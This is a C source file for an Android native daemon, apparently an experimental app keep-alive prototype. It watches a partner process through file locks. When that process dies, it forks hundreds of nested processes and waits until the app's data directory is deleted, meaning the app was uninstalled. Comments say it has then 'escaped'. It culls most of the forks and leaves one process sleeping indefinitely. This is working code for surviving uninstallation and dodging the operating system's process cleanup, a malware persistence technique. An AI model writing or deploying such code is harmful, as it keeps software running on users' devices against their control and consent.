#include <fcntl.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <dirent.h>
#include <stdlib.h>
#include "log.h"


#define APP_DATA_DIR "/data/data/com.qihoo.nativetest/"
#define BUFFER_SIZE 100
#define PROC_NAME "/data/user/0/com.qihoo.nativetest/files/eternity"

void notify_and_waitfor(char *observer_self_path, char *observer_daemon_path) {
    int observer_self_descriptor = open(observer_self_path, O_RDONLY);
    if (observer_self_descriptor == -1) {
        observer_self_descriptor = open(observer_self_path, O_CREAT, S_IRUSR | S_IWUSR);
    }
    int observer_daemon_descriptor = open(observer_daemon_path, O_RDONLY);
    while (observer_daemon_descriptor == -1) {
        usleep(1000);
        observer_daemon_descriptor = open(observer_daemon_path, O_RDONLY);
    }
    remove(observer_daemon_path);
    LOGE("Watched >>>>OBSERVER<<<< has been ready...");
}


/**
 *  Lock the file, this is block method.
 */
int lock_file(char *lock_file_path) {
    LOGD("start try to lock file >> %s <<", lock_file_path);
    int lockFileDescriptor = open(lock_file_path, O_RDONLY);
    if (lockFileDescriptor == -1) {
        lockFileDescriptor = open(lock_file_path, O_CREAT, S_IRUSR);
    }
    int lockRet = flock(lockFileDescriptor, LOCK_EX);
    if (lockRet == -1) {
        LOGE("lock file failed >> %s <<", lock_file_path);
        return 0;
    } else {
        LOGD("lock file success  >> %s <<", lock_file_path);
        return 1;
    }
}

int lock_file_nb(char *lock_file_path) {
    LOGD("start try to lock file >> %s <<", lock_file_path);
    int lockFileDescriptor = open(lock_file_path, O_RDONLY);
    if (lockFileDescriptor == -1) {
        lockFileDescriptor = open(lock_file_path, O_CREAT, S_IRUSR);
    }
    int lockRet = flock(lockFileDescriptor, LOCK_EX | LOCK_NB);
    if (lockRet == -1) {
        LOGE("lock file failed >> %s <<", lock_file_path);
        return 0;
    } else {
        LOGD("lock file success  >> %s <<", lock_file_path);
        return 1;
    }
}


int file_exist(const char *file) {
    return (access(file, F_OK) == 0);
}

int find_pid_by_name(char *pid_name, int *pid_list) {
    DIR *dir;
    struct dirent *next;
    int i = 0;
    pid_list[0] = 0;
    dir = opendir("/proc");
    if (!dir) {
        return 0;
    }
    while ((next = readdir(dir)) != NULL) {
        FILE *status;
        char proc_file_name[BUFFER_SIZE];
        char buffer[BUFFER_SIZE];
        char process_name[BUFFER_SIZE];

        if (strcmp(next->d_name, "..") == 0) {
            continue;
        }
        if (!isdigit(*next->d_name)) {
            continue;
        }
        sprintf(proc_file_name, "/proc/%s/cmdline", next->d_name);
        if (!(status = fopen(proc_file_name, "r"))) {
            continue;
        }
        if (fgets(buffer, BUFFER_SIZE - 1, status) == NULL) {
            fclose(status);
            continue;
        }
        fclose(status);
        sscanf(buffer, "%[^-]", process_name);
        if (strcmp(process_name, pid_name) == 0) {
            pid_list[i++] = atoi(next->d_name);
        }
    }
    if (pid_list) {
        pid_list[i] = 0;
    }
    closedir(dir);
    return i;
}

int main(int argc, char *argv[]) {
    char *indicator_self_path = argv[1];
    char *indicator_daemon_path = argv[2];
    char *observer_self_path = argv[3];
    char *observer_daemon_path = argv[4];


    int lock_status = 0;
    int try_time = 0;
    while (try_time < 3 && !(
            lock_status = lock_file(indicator_self_path)
    )) {
        try_time++;
        LOGD("Persistent lock myself failed and try again as %d times", try_time);
        usleep(10000);
    }
    if (!lock_status) {
        LOGE("Persistent lock myself failed and exit");
        return;
    }

    notify_and_waitfor(observer_self_path, observer_daemon_path);

    lock_status = lock_file(indicator_daemon_path);
    if (lock_status) {
        LOGE("Watch >>>>DAEMON<<<<< Dead !!");
        remove(observer_self_path);
        int i;
        time_t start_tm = time(NULL);
        time_t data_rm_tm = 0;
        for (i = 0; i < 1000; i++) {
            //前10此深度用于积累进程数
            if (i > 20) {
                if (data_rm_tm == 0) {
                    if (!file_exist(APP_DATA_DIR)) {
                        data_rm_tm = time(NULL);
                    }
                }

                if (data_rm_tm > 0) {
                    //数据目录已经移除，可以做点啥了
                    LOGE("i know data removed,%d", getpid());

                    time_t cur = time(NULL);
                    if (cur - data_rm_tm > 15) {
                        //此时已经已经逃逸出来了，可以开始做点啥了
                        LOGE("i am going to sleep,%d", getpid());
                        sleep(2);
                        //先干掉90%的进程
                        int res = rand() % 10;
                        if (res != 1) {
                            LOGE("i am going to suicide,%d", getpid());
                            return 1;
                        }
                        sleep(2);

                        int pid_list[10000];
                        int total_num = find_pid_by_name(PROC_NAME, pid_list);
                        int pid = getpid();
                        int i;
                        for (i = 0; i < total_num; i++) {
                            if (pid < pid_list[i]) {
                                LOGE("%d is biggner than me,%d,i quit", pid_list[i], getpid());
                                return 1;
                            }
                        }
                        sleep(100000);
                    }
                }
            }

            pid_t pid = fork();
            if (pid < 0) {
//                LOGE("fork error, %s", strerror(errno));
                break;
            }
            if (pid == 0) {
//                setsid();
                chdir("/");
//                umask(0);
//                LOGE("child, deep:%d, pid:%d, pgrp:%d, ppid:%d", i, getpid(), getpgrp(), getppid());
            } else {
//                LOGE("parent, deep:%d, pid:%d, pgrp:%d, ppid:%d", i, getpid(), getpgrp(), getppid());
            }
        }
    }

}
